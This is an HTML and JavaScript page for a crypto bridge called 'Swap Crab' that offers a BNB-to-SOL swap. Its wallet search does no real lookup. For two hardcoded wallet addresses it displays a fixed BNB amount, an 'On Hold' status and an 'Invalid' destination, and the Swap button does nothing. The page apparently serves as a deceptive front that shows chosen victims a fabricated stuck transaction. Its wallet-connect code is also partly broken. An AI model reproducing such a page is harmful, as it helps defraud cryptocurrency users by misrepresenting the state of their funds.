<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swap Crab</title>
    <link rel="icon" type="image/x-icon" href="icon.png">
    <link rel="stylesheet" type="text/css" href="header.css">
    <link rel="stylesheet" type="text/css" href="body.css">
    <link rel="stylesheet" type="text/css" href="footer.css">
<style>
@media only screen and (max-width: 850px) {

	#wallet-address {
	    display: none;
	}

}

</style>
</head>
<body>

<div class="header">
<a href="index.html"><img src="logo.png" align="left" class="logo"></a>
<b><p id="wallet-address" style="color:white;"></p></b>

<button id="connect-wallet"><b>Connect Wallet</b></button>
<button id="disconnect-wallet" style="display: none;"><b>Disconnect Wallet</b></button>
</div>

<div id="notification" style="background-color: transparent;"></div>

<table id="bridge-swap">
<tr>
	<td colspan=2><div class="input-container">
    <input type="text" id="search-wallet" placeholder=" ">
    <label for="username" id="input-label">Wallet Address</label>
  </div> </td>
	<td colspan=2 style="padding-top:30px;"><button id="search-btn" style="display: none;"><b>Search</b></button></td>
</tr>
</table>

<br>

<div id="bridge-swap-container" style="display: none; text-align: center;">	
	
<table id="tranx-details">
<tr>
<td colspan=2><h2>Transaction Details</h2></td>
</tr>

<tr>
	<td colspan=2><div class="input-container">
    <input type="text" id="sender" placeholder=" ">
    <label for="sender" id="input-label">Wallet Address</label>
  </div> </td>
</tr>
<tr>
	<td colspan=2><div class="input-container">
    <input type="text" id="bnb" placeholder=" ">
    <label for="bnb" id="input-label">BNB Amount</label>
  </div> </td>
</tr>
<tr>
	<td colspan=2><div class="input-container">
    <input type="text" id="sol" placeholder=" ">
    <label for="sol" id="input-label">Sol Amount</label>
  </div> </td>
</tr>

<tr>
	<td colspan=2><div class="input-container">
    <input type="text" id="status" placeholder=" ">
    <label for="status" id="input-label">Status</label>
  </div> </td>
</tr>


<tr>
	<td colspan=2><div class="input-container">
    <input type="text" id="receive" placeholder=" ">
    <label for="receive" id="input-label">Destination Address</label>
  </div> </td>
</tr>

	
<tr>
	<td colspan=2 style="padding-top:30px;"><button id="swap-btn">Swap</button></td>
</tr>

</table>
</div>
	
<script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
<script>

	document.getElementById('search-btn').addEventListener('click', async () => {
		
		if (document.getElementById('search-wallet').value === "0x9bc887dc283d030d682369b8f453446dacaf2e2b" || document.getElementById('search-wallet').value === "0x30F3Cd5DDd028592599Be25a42B9d467A43439F4")

		{
			document.getElementById('bridge-swap-container').style.display = 'block';
			document.getElementById('sender').value = document.getElementById('search-wallet').value;
			document.getElementById('bnb').value = '0.5907409723 BNB';
			document.getElementById('sol').value = '0';
			document.getElementById('status').value = 'On Hold : During Payment close the window. Sol wallet address not updated. ';
			document.getElementById('receive').value = 'Invalid';
		}
		else
		{
			console.log("No result")
		}
	});

document.getElementById('connect-wallet').addEventListener('click', async () => {
    try {

        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const networkId = await ethereum.request({ method: 'net_version' });

        // Check if the connected network is Binance Smart Chain (Mainnet or Testnet)
        if (networkId === '56' || networkId === '97') {
           walletAddress = accounts[0];

        //walletConnected = true;
        //document.getElementById("wallet-address").textContent = "Wallet Address : " + walletAddress;
	document.getElementById('search-wallet').value = walletAddress;
        //document.getElementById('disconnect-wallet').style.display = 'inline';
	document.getElementById('search-btn').style.display = 'inline-block';

        document.getElementById('connect-wallet').style.display = 'none';

        // Fetch and display BNB balance
        //balance = await web3.eth.getBalance(accounts[0]);
        balance = web3.utils.fromWei(balance, 'ether');
        document.getElementById('bnb').textContent = `Available: ${balance} BNB`;

         //   updateLog(walletAddress,'Home - Wallet Connect');
        } else {
            // Display an error message if the connected network is not BSC
        flashNotification('Error: Connect to Binance Smart Chain', 'red');

	  //  updateLog("Error: Connect Binance Chain", `❌ Home: ${error.message}`);
        }
    } catch (error) {
        flashNotification('Error connecting wallet', 'red');
	 //   updateLog("Error connecting wallet", `❌ Home: ${error.message}`);
    }
});


document.getElementById('disconnect-wallet').addEventListener('click', () => {
    ethereum.send('eth_requestAccounts').then(() => {
        walletConnected = false;
        document.getElementById("wallet-address").textContent = '';
        document.getElementById('connect-wallet').style.display = 'inline';
        document.getElementById('disconnect-wallet').style.display = 'none';

        if (ethereum && ethereum.disconnect) {
            ethereum.disconnect();
        }
    });
});

 </script>
</body>
</html>
	
